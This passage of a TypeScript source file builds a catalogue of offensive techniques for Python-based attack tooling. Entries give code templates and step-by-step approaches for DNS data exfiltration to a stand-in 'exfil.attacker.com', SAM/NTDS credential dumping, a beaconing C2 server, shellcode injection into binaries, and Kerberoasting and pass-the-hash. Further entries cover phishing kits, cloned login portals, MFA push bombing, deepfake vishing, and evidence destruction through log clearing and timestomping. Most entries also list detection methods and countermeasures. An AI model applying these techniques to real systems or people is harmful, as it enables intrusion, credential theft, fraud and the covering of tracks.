    mitreTechnique: 'T1548.001 - Setuid and Setgid',
    stealthRating: 0.8,
    reliability: 0.9,
    prerequisites: ['local_access'],
    detection: ['File access monitoring', 'Process monitoring'],
    countermeasures: ['Remove unnecessary SUID', 'Audit cron jobs', 'Restrict sudo'],
  })
  add({
    id: 'pytool-data-exfiltrator',
    name: 'Data Exfiltration Framework',
    domain: 'evasion',
    description:
      'Multi-channel data exfiltration — DNS tunneling, HTTPS POST, ICMP tunneling, steganography, cloud storage upload, email exfil with chunking and encryption',
    pythonLibraries: ['requests', 'dnspython', 'scapy', 'pycryptodome'],
    codeTemplate:
      'data = encrypt(compress(file_data)); chunks = chunk(data, 255); for chunk in chunks: dns_query(f"{b32encode(chunk).decode()}.exfil.attacker.com")',
    difficulty: 'advanced',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1048 - Exfiltration Over Alternative Protocol',
    stealthRating: 0.6,
    reliability: 0.7,
    prerequisites: ['data_access', 'network_egress'],
    detection: ['DNS anomaly detection', 'DLP', 'Network monitoring'],
    countermeasures: ['DLP solutions', 'DNS monitoring', 'Egress filtering'],
  })
  add({
    id: 'pytool-password-audit',
    name: 'Password Audit Tool',
    domain: 'crypto_attack',
    description:
      'Comprehensive password auditing — hash extraction from various formats (SAM, shadow, NTDS.dit), offline cracking with rules, password policy compliance checking',
    pythonLibraries: ['hashlib', 'impacket', 'subprocess'],
    codeTemplate:
      'from impacket.secretsdump import SAMHashes; sam = SAMHashes(sam_file, boot_key); sam.dump(); # Extract and crack hashes',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1003 - OS Credential Dumping',
    stealthRating: 0.8,
    reliability: 0.85,
    prerequisites: ['hash_file_or_access'],
    detection: ['Offline — no detection'],
    countermeasures: ['Strong passwords', 'MFA', 'Password managers'],
  })
  add({
    id: 'pytool-log-analyzer',
    name: 'Security Log Analyzer',
    domain: 'forensics_evasion',
    description:
      'Analyze security logs to identify detection gaps — parse Windows Event Logs, syslog, firewall logs, correlate events to identify blind spots for evasion',
    pythonLibraries: ['os', 're', 'json', 'xml.etree'],
    codeTemplate:
      'import xml.etree.ElementTree as ET; for event in ET.parse("Security.evtx").findall(".//Event"): if event.find(".//EventID").text in watchlist: analyze(event)',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1070 - Indicator Removal',
    stealthRating: 1.0,
    reliability: 0.8,
    prerequisites: ['log_access'],
    detection: ['Offline — no detection'],
    countermeasures: ['Centralized logging', 'Log integrity monitoring'],
  })
  add({
    id: 'pytool-c2-manager',
    name: 'C2 Infrastructure Manager',
    domain: 'c2_framework',
    description:
      'Manage multiple C2 channels from single interface — agent registration, task distribution, result collection, channel switching, health monitoring',
    pythonLibraries: ['flask', 'requests', 'pycryptodome', 'sqlalchemy'],
    codeTemplate:
      'app = Flask(__name__); @app.route("/beacon", methods=["POST"]): agent_id = decrypt(request.data); tasks = get_tasks(agent_id); return encrypt(json.dumps(tasks))',
    difficulty: 'advanced',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1071 - Application Layer Protocol',
    stealthRating: 0.5,
    reliability: 0.85,
    prerequisites: ['server_infrastructure', 'domain'],
    detection: ['C2 traffic analysis', 'Beacon pattern detection'],
    countermeasures: ['Network monitoring', 'TLS inspection', 'Domain reputation'],
  })
  add({
    id: 'pytool-ad-attack-suite',
    name: 'Active Directory Attack Suite',
    domain: 'network_attack',
    description:
      'Comprehensive AD attack toolkit — BloodHound data collection, Kerberoasting, AS-REP roasting, DCSync, NTLM relay, domain enumeration, credential extraction',
    pythonLibraries: ['impacket', 'ldap3', 'dnspython'],
    codeTemplate:
      'from impacket.smbconnection import SMBConnection; conn = SMBConnection(target, target); conn.login(username, password); # Enumerate shares, users, groups',
    difficulty: 'advanced',
    targetOS: 'windows',
    mitreTechnique: 'T1087 - Account Discovery',
    stealthRating: 0.4,
    reliability: 0.8,
    prerequisites: ['domain_credentials', 'network_access'],
    detection: ['LDAP query monitoring', 'Kerberos anomaly detection'],
    countermeasures: ['Tiered administration', 'Protected users group', 'Monitoring'],
  })
  add({
    id: 'pytool-cloud-enum',
    name: 'Cloud Infrastructure Enumerator',
    domain: 'reconnaissance',
    description:
      'Multi-cloud asset discovery — enumerate AWS S3 buckets, Azure blobs, GCP storage, open endpoints, exposed databases, serverless functions',
    pythonLibraries: ['boto3', 'requests', 'dnspython'],
    codeTemplate:
      'import boto3; s3 = boto3.client("s3", config=Config(signature_version=UNSIGNED)); # Check public bucket access, list objects, identify sensitive files',
    difficulty: 'intermediate',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1580 - Cloud Infrastructure Discovery',
    stealthRating: 0.8,
    reliability: 0.7,
    prerequisites: ['target_domain', 'cloud_provider_info'],
    detection: ['Cloud access logging', 'Bucket access monitoring'],
    countermeasures: ['Private buckets', 'Access logging', 'Least privilege'],
  })
  add({
    id: 'pytool-binary-patcher',
    name: 'Binary Patching Tool',
    domain: 'reverse_engineering',
    description:
      'Patch PE/ELF binaries in Python — modify instructions, inject sections, change imports, bypass license checks, hook functions in compiled binaries',
    pythonLibraries: ['lief', 'capstone', 'keystone-engine'],
    codeTemplate:
      'import lief; binary = lief.parse("target.exe"); section = lief.PE.Section(".inject"); section.content = shellcode; binary.add_section(section); binary.write("patched.exe")',
    difficulty: 'advanced',
    targetOS: 'cross_platform',
    mitreTechnique: 'T1574.010 - Services File Permissions Weakness',
    stealthRating: 0.5,
    reliability: 0.7,
    prerequisites: ['target_binary'],
    detection: ['File integrity monitoring', 'Signature verification'],
    countermeasures: ['Code signing', 'Integrity checks', 'Whitelisting'],
  })

  return db
}

// ── New Domain Builders ──────────────────────────────────────────────────────

function buildCryptoAttacks(): CryptoAttack[] {
  const db: CryptoAttack[] = []
  const add = (a: CryptoAttack) => {
    db.push(a)
  }

  add({
    id: 'pycrypto-rainbow',
    name: 'Rainbow Table Hash Cracking',
    category: 'hash_cracking',
    description:
      'Precomputed rainbow table lookups for fast hash reversal — trade storage for computation time, effective against unsalted hashes like MD5/NTLM',
    pythonApproach:
      'Build or load rainbow tables as sorted dict/database, binary search lookup for target hash, hashcat Python wrapper (subprocess) for GPU-accelerated cracking with --attack-mode 0',
    libraries: ['hashlib', 'sqlite3', 'subprocess'],
    targetAlgorithm: 'MD5/NTLM/SHA1',
    difficulty: 'intermediate',
  })
  add({
    id: 'pycrypto-gpu-crack',
    name: 'GPU-Accelerated Hash Cracking',
    category: 'hash_cracking',
    description:
      'Leverage GPU parallelism via hashcat/john Python bindings — rule-based mutations, mask attacks, hybrid wordlist+brute force combinations',
    pythonApproach:
      'subprocess wrapper for hashcat with -m (hash mode), -a 3 (mask attack), --rules for mutations, parse output for cracked hashes, integrate john --format= for alternate algorithms',
    libraries: ['subprocess', 'hashlib'],
    targetAlgorithm: 'bcrypt/SHA-256/SHA-512/NTLM',
    difficulty: 'intermediate',
  })
  add({
    id: 'pycrypto-padding-oracle',
    name: 'Padding Oracle Attack on CBC',
    category: 'cipher_attack',
    description:
      'Exploit CBC padding validation to decrypt ciphertext byte-by-byte — manipulate IV/previous block to trigger valid/invalid padding responses',
    pythonApproach:
      'Iterate each byte position from end, XOR intermediary values with desired plaintext, detect valid padding via oracle response (timing/error), reconstruct plaintext block by block',
    libraries: ['pycryptodome', 'requests'],
    targetAlgorithm: 'AES-CBC/DES-CBC',
    difficulty: 'advanced',
  })
  add({
    id: 'pycrypto-ecb-known',
    name: 'AES ECB Known-Plaintext Analysis',
    category: 'cipher_attack',
    description:
      'Exploit AES ECB mode deterministic encryption — detect repeated blocks, byte-at-a-time decryption by controlling plaintext prefix alignment',
    pythonApproach:
      'Send controlled plaintext to detect ECB (repeated ciphertext blocks), align target secret at block boundary, brute-force one byte at a time by comparing encrypted blocks',
    libraries: ['pycryptodome', 'requests'],
    targetAlgorithm: 'AES-ECB',
    difficulty: 'advanced',
  })
  add({
    id: 'pycrypto-password-spray',
    name: 'Online Password Spraying',
    category: 'password_attack',
    description:
      'Spray common passwords across many accounts — avoid lockout by limiting attempts per account, rotate through username list with single password',
    pythonApproach:
      'requests-based login attempt with configurable delay between attempts, rotate passwords across users (1 password per user per interval), detect lockout/success via HTTP response',
    libraries: ['requests', 'concurrent.futures'],
    targetAlgorithm: 'Authentication protocols',
    difficulty: 'beginner',
  })
  add({
    id: 'pycrypto-offline-dict',
    name: 'Offline Dictionary Attack',
    category: 'password_attack',
    description:
      'Fast offline hash cracking with wordlists and rule-based mutations — apply leetspeak, case toggle, prefix/suffix rules to expand dictionary coverage',
    pythonApproach:
      'Load wordlist file, apply mutation rules (capitalize, l33t, append digits/symbols), hash each candidate with target algorithm (hashlib), compare against target hash',
    libraries: ['hashlib', 'itertools', 'concurrent.futures'],
    targetAlgorithm: 'MD5/SHA-1/SHA-256/bcrypt',
    difficulty: 'beginner',
  })
  add({
    id: 'pycrypto-rsa-wiener',
    name: 'RSA Wiener/Small Exponent Attack',
    category: 'key_recovery',
    description:
      'Attack RSA with small private exponent via Wiener continued fraction method — recover d when d < N^0.25, also Boneh-Durfee for d < N^0.292',
    pythonApproach:
      'Compute continued fraction expansion of e/N, test convergents as candidate d values, verify by encrypting/decrypting test message, also implement Coppersmith for small e',
    libraries: ['sympy', 'gmpy2'],
    targetAlgorithm: 'RSA',
    difficulty: 'advanced',
  })
  add({
    id: 'pycrypto-ecdsa-nonce',
    name: 'ECDSA Nonce Reuse Recovery',
    category: 'key_recovery',
    description:
      'Recover ECDSA private key from nonce (k) reuse — when same k is used for two signatures, private key can be algebraically computed from the two signature pairs',
    pythonApproach:
      'Given two signatures (r,s1) and (r,s2) with same r (indicating k reuse), compute k = (z1-z2)/(s1-s2) mod n, then private key x = (s1*k - z1)/r mod n',
    libraries: ['ecdsa', 'gmpy2', 'hashlib'],
    targetAlgorithm: 'ECDSA (secp256k1/P-256)',
    difficulty: 'expert',
  })
  add({
    id: 'pycrypto-ssl-downgrade',
    name: 'SSL/TLS Downgrade Attack',
    category: 'protocol_attack',
    description:
      'Force TLS downgrade to exploit weaker cipher suites — POODLE (SSLv3 CBC), BEAST (TLS 1.0 CBC), DROWN (SSLv2 cross-protocol)',
    pythonApproach:
      'mitmproxy/scapy to intercept ClientHello, modify supported versions to force SSLv3/TLS1.0, exploit CBC padding in downgraded session, or test for DROWN vulnerable servers',
    libraries: ['scapy', 'mitmproxy', 'ssl'],
    targetAlgorithm: 'SSL/TLS protocol',
    difficulty: 'expert',
  })
  add({
    id: 'pycrypto-mt-recover',
    name: 'Mersenne Twister State Recovery',
    category: 'rng_exploit',
    description:
      'Recover internal state of Mersenne Twister PRNG from 624 consecutive outputs — predict all future and past random values',
    pythonApproach:
      'Collect 624 32-bit outputs, untemper each to recover internal state array, clone MT19937 state into Python random.Random instance, predict all subsequent outputs',
    libraries: ['random', 'struct'],
    targetAlgorithm: 'MT19937 (Python random)',
    difficulty: 'advanced',
  })
  add({
    id: 'pycrypto-timing',
    name: 'Timing Attack on Password Comparison',
    category: 'side_channel',
    description:
      'Exploit non-constant-time string comparison to recover secrets byte-by-byte — measure response time variance to determine correct characters',
    pythonApproach:
      'requests with precise timing (time.perf_counter_ns), send candidate passwords with each position bruteforced, statistical analysis of response times to detect correct bytes',
    libraries: ['requests', 'time', 'statistics'],
    targetAlgorithm: 'String comparison',
    difficulty: 'advanced',
  })
  add({
    id: 'pycrypto-cert-bypass',
    name: 'Certificate Pinning Bypass',
    category: 'certificate_attack',
    description:
      'Bypass SSL certificate pinning in applications — Frida hook of SSL verification functions, custom CA injection, objection framework for mobile apps',
    pythonApproach:
      'Frida script to hook SSL_CTX_set_verify/SecTrustEvaluate, replace certificate validation with always-success, or inject custom CA into application trust store',
    libraries: ['frida', 'mitmproxy', 'requests'],
    targetAlgorithm: 'X.509/SSL pinning',
    difficulty: 'intermediate',
  })

  // Extended crypto attacks
  add({
    id: 'pycrypto-hash-length',
    name: 'Hash Length Extension Attack',
    category: 'cipher_attack',
    description:
      'Exploit Merkle-Damgard hash construction to append data to hashed message without knowing secret — works against MD5, SHA-1, SHA-256 HMAC-like constructs',
    pythonApproach:
      'Reconstruct internal hash state from known hash output, continue hashing with appended data and padding, forge valid hash for extended message without knowing the secret prefix',
    libraries: ['hashlib', 'struct', 'hashpumpy'],
    targetAlgorithm: 'MD5/SHA-1/SHA-256 (Merkle-Damgard)',
    difficulty: 'advanced',
  })
  add({
    id: 'pycrypto-kerberoast',
    name: 'Kerberoasting Attack',
    category: 'password_attack',
    description:
      'Request TGS tickets for service accounts and crack offline — target accounts with SPNs, extract ticket hashes, crack with wordlist for service account passwords',
    pythonApproach:
      'impacket GetUserSPNs.py to request TGS tickets, extract encrypted portion (RC4/AES), crack offline with hashcat mode 13100 (Kerberoast) or john',
    libraries: ['impacket', 'subprocess'],
    targetAlgorithm: 'Kerberos RC4-HMAC/AES',
    difficulty: 'intermediate',
  })
  add({
    id: 'pycrypto-bleichenbacher',
    name: 'Bleichenbacher RSA Padding Oracle',
    category: 'protocol_attack',
    description:
      'Exploit PKCS#1 v1.5 padding oracle in RSA implementations — adaptive chosen ciphertext attack to decrypt RSA ciphertexts or forge signatures',
    pythonApproach:
      'Send modified ciphertexts to oracle, binary search for valid PKCS#1 padding boundaries, iteratively narrow plaintext range until full recovery (requires ~10K oracle queries)',
    libraries: ['pycryptodome', 'gmpy2', 'requests'],
    targetAlgorithm: 'RSA PKCS#1 v1.5',
    difficulty: 'expert',
  })
  add({
    id: 'pycrypto-pass-the-hash',
    name: 'Pass-the-Hash/Pass-the-Ticket',
    category: 'password_attack',
    description:
      'Authenticate using captured NTLM hashes or Kerberos tickets without cracking — relay hashes for lateral movement across Windows domains',
    pythonApproach:
      'impacket smbclient/wmiexec/psexec with -hashes flag for NTLM pass-the-hash, or export .kirbi tickets for pass-the-ticket authentication to other services',
    libraries: ['impacket', 'pycryptodome'],
    targetAlgorithm: 'NTLM/Kerberos',
    difficulty: 'intermediate',
  })
  add({
    id: 'pycrypto-aes-fault',
    name: 'AES Differential Fault Analysis',
    category: 'side_channel',
    description:
      'Recover AES key by inducing faults during encryption — analyze differences between correct and faulty ciphertexts to recover round keys',
    pythonApproach:
      'Inject fault during round 8 of AES-128, collect correct/faulty ciphertext pairs, use differential cryptanalysis on round 10 output to recover last round key, invert key schedule',
    libraries: ['pycryptodome', 'numpy'],
    targetAlgorithm: 'AES-128/192/256',
    difficulty: 'expert',
  })
  add({
    id: 'pycrypto-jwt-crack',
    name: 'JWT Secret Key Cracking',
    category: 'password_attack',
    description:
      'Brute force weak JWT HMAC signing keys — extract header and payload from JWT token, try wordlist of secrets to find matching HMAC signature',
    pythonApproach:
      'Split JWT into parts, decode header/payload, for each candidate secret: compute HMAC-SHA256(header.payload, secret), compare with JWT signature until match found',
    libraries: ['pyjwt', 'hashlib', 'hmac'],
    targetAlgorithm: 'HMAC-SHA256 (JWT)',
    difficulty: 'beginner',
  })
  add({
    id: 'pycrypto-rc4-bias',
    name: 'RC4 Keystream Bias Exploitation',
    category: 'cipher_attack',
    description:
      'Exploit statistical biases in RC4 keystream — second-byte bias, Fluhrer-Mantin-Shamir attack on WEP, bias in initial keystream bytes for plaintext recovery',
    pythonApproach:
      'Collect multiple ciphertexts encrypted with related keys, statistical analysis of byte positions with known bias, recover plaintext bytes via majority voting across samples',
    libraries: ['pycryptodome', 'numpy'],
    targetAlgorithm: 'RC4/WEP',
    difficulty: 'expert',
  })
  add({
    id: 'pycrypto-asrep-roast',
    name: 'AS-REP Roasting',
    category: 'password_attack',
    description:
      'Attack Kerberos accounts without pre-authentication — request AS-REP for accounts with DONT_REQUIRE_PREAUTH, crack encrypted part offline',
    pythonApproach:
      'impacket GetNPUsers.py to find accounts without pre-auth, request AS-REP, extract encrypted timestamp, crack offline with hashcat mode 18200',
    libraries: ['impacket', 'subprocess'],
    targetAlgorithm: 'Kerberos AS-REP (RC4/AES)',
    difficulty: 'intermediate',
  })

  return db
}

function buildSocialEngineeringAttacks(): SocialEngineeringAttack[] {
  const db: SocialEngineeringAttack[] = []
  const add = (a: SocialEngineeringAttack) => {
    db.push(a)
  }

  add({
    id: 'pyse-mass-phish',
    name: 'Mass Phishing Campaign',
    category: 'phishing',
    description:
      'Automated mass phishing with GoPhish Python API — template management, target group import, campaign scheduling, result tracking and reporting',
    pythonApproach:
      'GoPhish REST API via requests, create email templates with tracking pixels, import CSV target lists, schedule campaigns with staggered delivery, poll for results',
    libraries: ['requests', 'gophish'],
    targetVector: 'Email',
    successRate: 0.15,
    difficulty: 'intermediate',
  })
  add({
    id: 'pyse-spear-phish',
    name: 'Targeted Spear Phishing with OSINT',
    category: 'spear_phishing',
    description:
      'Highly targeted phishing using OSINT enrichment — LinkedIn scraping for role/interests, personalized email content, contextual pretexts based on recent events',
    pythonApproach:
      'Scrape target LinkedIn/social profiles with selenium, identify recent activities/interests, generate personalized email with jinja2 templates, include context-specific pretext',
    libraries: ['selenium', 'beautifulsoup4', 'jinja2', 'smtplib'],
    targetVector: 'Email (personalized)',
    successRate: 0.45,
    difficulty: 'advanced',
  })
  add({
    id: 'pyse-oauth-phish',
    name: 'OAuth Token Phishing',
    category: 'credential_harvest',
    description:
      'Phish OAuth consent flow — create malicious OAuth app requesting broad permissions, send consent URL to targets, capture OAuth tokens for persistent API access',
    pythonApproach:
      'Register OAuth application with broad scopes, generate authorization URL, send via phishing email, capture authorization code at redirect_uri, exchange for access/refresh tokens',
    libraries: ['flask', 'requests', 'oauthlib'],
    targetVector: 'OAuth consent flow',
    successRate: 0.3,
    difficulty: 'advanced',
  })
  add({
    id: 'pyse-fake-login',
    name: 'Fake Login Portal with Flask',
    category: 'credential_harvest',
    description:
      'Clone target login page and host credential harvesting portal — capture submitted credentials, redirect to real site for transparency, log with timestamps',
    pythonApproach:
      'requests + BeautifulSoup to clone target login page, Flask to serve cloned page, capture POST data with credential logging, redirect to legitimate site after capture',
    libraries: ['flask', 'requests', 'beautifulsoup4'],
    targetVector: 'Web login forms',
    successRate: 0.35,
    difficulty: 'intermediate',
  })
  add({
    id: 'pyse-vishing',
    name: 'VoIP Call Automation',
    category: 'vishing',
    description:
      'Automated voice phishing via SIP/VoIP — generate pretext audio with TTS, auto-dial target list, IVR-style menu to capture PIN/credentials, record calls',
    pythonApproach:
      'pjsua2/linphone Python bindings for SIP registration and call placement, pyttsx3/gTTS for text-to-speech pretext generation, DTMF detection for credential capture',
    libraries: ['pjsua2', 'pyttsx3', 'requests'],
    targetVector: 'Phone/VoIP',
    successRate: 0.2,
    difficulty: 'advanced',
  })
  add({
    id: 'pyse-smishing',
    name: 'SMS Phishing via Twilio',
    category: 'smishing',
    description:
      'Bulk SMS phishing using Twilio API — shortened malicious URLs, delivery scheduling, opt-out handling, click tracking via redirect server',
    pythonApproach:
      'Twilio Python SDK for bulk SMS delivery, URL shortener integration for tracking, Flask redirect server for click logging and credential page serving',
    libraries: ['twilio', 'flask', 'requests'],
    targetVector: 'SMS',
    successRate: 0.1,
    difficulty: 'intermediate',
  })
  add({
    id: 'pyse-pretext-gen',
    name: 'Automated Pretext Generation',
    category: 'pretexting',
    description:
      'Generate contextual pretexts using target OSINT — company news, industry events, and role-specific scenarios for convincing social engineering narratives',
    pythonApproach:
      'Scrape company news/press releases, LinkedIn job postings, industry publications, use jinja2 templates to generate role-appropriate pretext scenarios',
    libraries: ['requests', 'beautifulsoup4', 'jinja2'],
    targetVector: 'Multi-channel',
    successRate: 0.25,
    difficulty: 'intermediate',
  })
  add({
    id: 'pyse-usb-drop',
    name: 'USB Drop Attack Payload Generation',
    category: 'baiting',
    description:
      'Generate USB drop attack payloads — HID attack scripts (Rubber Ducky), autorun payloads, enticing file names, and document-based macros for USB baiting',
    pythonApproach:
      'Generate Rubber Ducky DuckyScript payloads, create autorun.inf with executable, generate enticing filenames (salary_Q4.xlsx.exe), embed macros in Office documents',
    libraries: ['python-docx', 'openpyxl', 'subprocess'],
    targetVector: 'USB/Physical',
    successRate: 0.3,
    difficulty: 'intermediate',
  })
  add({
    id: 'pyse-watering-hole',
    name: 'Website Clone and Inject',
    category: 'watering_hole',
    description:
      'Clone frequently visited website and inject malicious JavaScript — BeEF hook integration, credential interception, browser exploitation framework deployment',
    pythonApproach:
      'wget-style recursive clone with requests/BeautifulSoup, inject BeEF hook.js or custom JavaScript keylogger into cloned pages, deploy via DNS poisoning or typosquatting',
    libraries: ['requests', 'beautifulsoup4', 'flask'],
    targetVector: 'Web (cloned site)',
    successRate: 0.2,
    difficulty: 'advanced',
  })
  add({
    id: 'pyse-email-spoof',
    name: 'Email Spoofing with SMTP',
    category: 'phishing',
    description:
      'Spoof email sender addresses exploiting missing SPF/DKIM/DMARC — craft emails appearing from trusted internal addresses or executive accounts',
    pythonApproach:
      'smtplib with crafted email headers (From, Reply-To, Return-Path), check target domain for SPF/DKIM/DMARC absence, use open relays or misconfigured SMTP servers',
    libraries: ['smtplib', 'email', 'dnspython'],
    targetVector: 'Email (spoofed sender)',
    successRate: 0.25,
    difficulty: 'intermediate',
  })
  add({
    id: 'pyse-bitb',
    name: 'Browser-in-the-Browser (BitB) Attack',
    category: 'credential_harvest',
    description:
      'Simulate fake browser popup window within page using CSS/HTML — mimics OAuth/SSO login popups from Google, Microsoft, Apple for credential harvesting',
    pythonApproach:
      'Flask-served HTML page with CSS-styled fake browser window popup, intercept form submission, mimic Google/Microsoft OAuth popup appearance with draggable window',
    libraries: ['flask', 'jinja2'],
    targetVector: 'Web (fake popup)',
    successRate: 0.4,
    difficulty: 'intermediate',
  })
  add({
    id: 'pyse-drive-by',
    name: 'Drive-by Download Framework',
    category: 'watering_hole',
    description:
      'Automated drive-by download attack — browser fingerprinting, exploit kit selection, payload delivery based on detected browser/OS/plugins',
    pythonApproach:
      'Flask server with JavaScript browser fingerprinting, select exploit based on detected browser version, serve matching exploit and payload, track successful infections',
    libraries: ['flask', 'requests', 'user-agents'],
    targetVector: 'Web (automatic download)',
    successRate: 0.15,
    difficulty: 'expert',
  })

  // Extended social engineering
  add({
    id: 'pyse-qr-phish',
    name: 'QR Code Phishing (Quishing)',
    category: 'phishing',
    description:
      'Generate malicious QR codes linking to phishing pages — embed in printed materials, emails, or physical locations for credential harvesting',
    pythonApproach:
      'qrcode library to generate QR codes pointing to attacker URL, embed in PDF/image documents, track scans via redirect server with device fingerprinting',
    libraries: ['qrcode', 'pillow', 'flask'],
    targetVector: 'QR Code (physical/digital)',
    successRate: 0.2,
    difficulty: 'beginner',
  })
  add({
    id: 'pyse-callback-phish',
    name: 'Callback Phishing (BazarCall)',
    category: 'vishing',
    description:
      'Hybrid phishing attack — send email with fake invoice/subscription, victim calls phone number where attacker guides them to install malware',
    pythonApproach:
      'Generate convincing invoice emails with jinja2, include callback number, VoIP auto-attendant script guides caller through malware installation steps',
    libraries: ['smtplib', 'jinja2', 'pjsua2'],
    targetVector: 'Email + Phone callback',
    successRate: 0.25,
    difficulty: 'advanced',
  })
  add({
    id: 'pyse-mfa-fatigue',
    name: 'MFA Fatigue / Push Bombing',
    category: 'credential_harvest',
    description:
      'Overwhelm target with MFA push notifications until they approve — automated repeated authentication attempts to trigger fatigue-based approval',
    pythonApproach:
      'Automated login attempts via requests with captured credentials, trigger MFA push repeatedly at random intervals, detect successful approval via session token',
    libraries: ['requests', 'time'],
    targetVector: 'MFA push notifications',
    successRate: 0.15,
    difficulty: 'intermediate',
  })
  add({
    id: 'pyse-deepfake-audio',
    name: 'Audio Deepfake for Vishing',
    category: 'pretexting',
    description:
      'Generate synthetic voice audio mimicking target executive using voice cloning — use in vishing calls for authority-based social engineering',
    pythonApproach:
      'Collect voice samples from public sources (YouTube, podcasts), train voice cloning model, generate synthetic audio for pretext scenarios, integrate with VoIP system',
    libraries: ['requests', 'pyttsx3', 'subprocess'],
    targetVector: 'Phone (synthetic voice)',
    successRate: 0.35,
    difficulty: 'expert',
  })
  add({
    id: 'pyse-evilginx-proxy',
    name: 'Reverse Proxy Phishing (Evilginx-style)',
    category: 'credential_harvest',
    description:
      'Man-in-the-middle phishing with reverse proxy — capture session tokens and MFA codes by proxying real login page, full session hijacking post-authentication',
    pythonApproach:
      'mitmproxy-based reverse proxy sitting between victim and real login page, capture all cookies/tokens post-auth, replay session tokens for account takeover',
    libraries: ['mitmproxy', 'requests'],
    targetVector: 'Web (reverse proxy)',
    successRate: 0.5,
    difficulty: 'advanced',
  })
  add({
    id: 'pyse-calendar-phish',
    name: 'Calendar Invitation Phishing',
    category: 'phishing',
    description:
      'Send malicious calendar invitations — auto-accepted events with phishing links in description, exploits calendar auto-add behavior in some clients',
    pythonApproach:
      'Generate ICS calendar file with phishing URL in event description/location, send as email attachment or direct calendar share, exploit auto-accept features',
    libraries: ['icalendar', 'smtplib'],
    targetVector: 'Calendar invitation',
    successRate: 0.2,
    difficulty: 'beginner',
  })

  return db
}

function buildForensicsEvasionTechniques(): ForensicsEvasionTechnique[] {
  const db: ForensicsEvasionTechnique[] = []
  const add = (t: ForensicsEvasionTechnique) => {
    db.push(t)
  }

  add({
    id: 'pyforensic-winlog',
    name: 'Windows Event Log Clearing',
    category: 'log_clearing',
    description:
      'Clear or selectively tamper with Windows Event Logs — wevtutil wrapper, individual event deletion, log service manipulation via Python',
    pythonApproach:
      'subprocess with wevtutil cl Security/System/Application, or ctypes EvtClearLog/EvtExportLog for selective filtering, disable EventLog service temporarily',
    libraries: ['subprocess', 'ctypes', 'win32evtlog'],
    targetArtifact: 'Windows Event Logs (Security/System/Application)',
    effectiveness: 0.7,
  })
  add({
    id: 'pyforensic-linuxlog',
    name: 'Linux Log Tampering',
    category: 'log_clearing',
    description:
      'Selectively modify Linux system logs — parse and filter /var/log entries matching attacker patterns, handle binary logs (wtmp/utmp/lastlog) with struct packing',
    pythonApproach:
      'Open /var/log/auth.log, syslog in text mode, filter lines by IP/username regex. For binary wtmp/utmp: struct.unpack each record, skip matching entries, rewrite file',
    libraries: ['os', 're', 'struct'],
    targetArtifact: 'Linux system logs (/var/log/auth.log, wtmp, utmp, lastlog)',
    effectiveness: 0.65,
  })
  add({
    id: 'pyforensic-ntfs-timestomp',
    name: 'NTFS Timestamp Manipulation',
    category: 'timestomping',
    description:
      'Modify all four NTFS timestamps (MACE: Modified, Accessed, Created, Entry) — bypass standard API limitations using direct MFT manipulation or SetFileTime',
    pythonApproach:
      'ctypes kernel32.SetFileTime for MACE timestamps, or direct NTFS MFT parsing with pytsk3 for entry-modified timestamp manipulation beyond Windows API',
    libraries: ['ctypes', 'pytsk3', 'datetime'],
    targetArtifact: 'NTFS $STANDARD_INFORMATION and $FILE_NAME timestamps',
    effectiveness: 0.75,
  })
  add({
    id: 'pyforensic-linux-timestomp',
    name: 'Linux File Timestamp Modification',
    category: 'timestomping',
    description:
      'Modify Linux file timestamps — os.utime for atime/mtime, copy timestamps from reference files, manipulate ext4 ctime via debugfs',
    pythonApproach:
      'os.utime(path, (atime, mtime)) for access/modify times, shutil.copystat for reference file matching, subprocess debugfs for ext4 ctime/crtime manipulation',
    libraries: ['os', 'shutil', 'subprocess'],
    targetArtifact: 'Linux filesystem timestamps (atime/mtime/ctime)',
    effectiveness: 0.7,
  })
  add({
    id: 'pyforensic-browser-clean',
    name: 'Browser Artifact Cleanup',
    category: 'artifact_removal',
    description:
      'Remove browser forensic artifacts — history SQLite databases, cookies, cache, saved passwords, download records, session data for all major browsers',
    pythonApproach:
      'Locate browser profile directories (Chrome/Firefox/Edge), connect to SQLite databases, DELETE FROM matched records, or securely overwrite and recreate files',
    libraries: ['sqlite3', 'os', 'shutil', 'glob'],
    targetArtifact: 'Browser history, cookies, cache, saved passwords',
    effectiveness: 0.7,
  })
  add({
    id: 'pyforensic-prefetch-clean',
    name: 'Windows Prefetch/Registry Cleanup',
    category: 'artifact_removal',
    description:
      'Remove Windows execution artifacts — delete prefetch files, clean UserAssist registry keys, clear ShimCache, AmCache, and BAM/DAM entries',
    pythonApproach:
      'os.remove for C:\\Windows\\Prefetch\\*.pf matching tool names, winreg to clear UserAssist ROT13 encoded entries, ShimCache registry manipulation',
    libraries: ['os', 'winreg', 'ctypes', 'struct'],
    targetArtifact: 'Windows Prefetch, UserAssist, ShimCache, AmCache',
    effectiveness: 0.65,
  })
  add({
    id: 'pyforensic-ram-wipe',
    name: 'RAM Artifact Overwrite',
    category: 'memory_wiping',
    description:
      'Overwrite sensitive data in process memory — zero out decrypted credentials, encryption keys, and command history before process exit',
    pythonApproach:
      'ctypes memmove/memset to overwrite sensitive string/byte buffers, gc.collect() to trigger cleanup, override __del__ on sensitive objects for auto-wipe',
    libraries: ['ctypes', 'gc', 'sys'],
    targetArtifact: 'Process memory (credentials, keys, commands)',
    effectiveness: 0.6,
  })
  add({
    id: 'pyforensic-secure-delete',
    name: 'Secure File Deletion with Overwrite',
    category: 'disk_wiping',
    description:
      'Securely delete files with multiple overwrite passes — DoD 5220.22-M standard, Gutmann method, random data overwrite before unlink',
    pythonApproach:
      'Open file in write mode, overwrite with random bytes (os.urandom), then all zeros, then random again (3+ passes), os.fsync, then os.unlink',
    libraries: ['os', 'shutil'],
    targetArtifact: 'Deleted files (prevent recovery)',
    effectiveness: 0.8,
  })
  add({
    id: 'pyforensic-anti-vm',
    name: 'Anti-VM/Sandbox Detection',
    category: 'anti_forensics',
    description:
      'Detect analysis virtual machines and sandboxes — check hardware fingerprints, timing anomalies, user interaction patterns, and environment artifacts',
    pythonApproach:
      'Check for VM artifacts (registry keys, MAC OUI, device drivers), measure instruction timing deltas, verify mouse movement and user interaction, check process list for analysis tools',
    libraries: ['os', 'ctypes', 'psutil', 'platform', 'time'],
    targetArtifact: 'Analysis environment detection',
    effectiveness: 0.75,
  })
  add({
    id: 'pyforensic-img-stego',
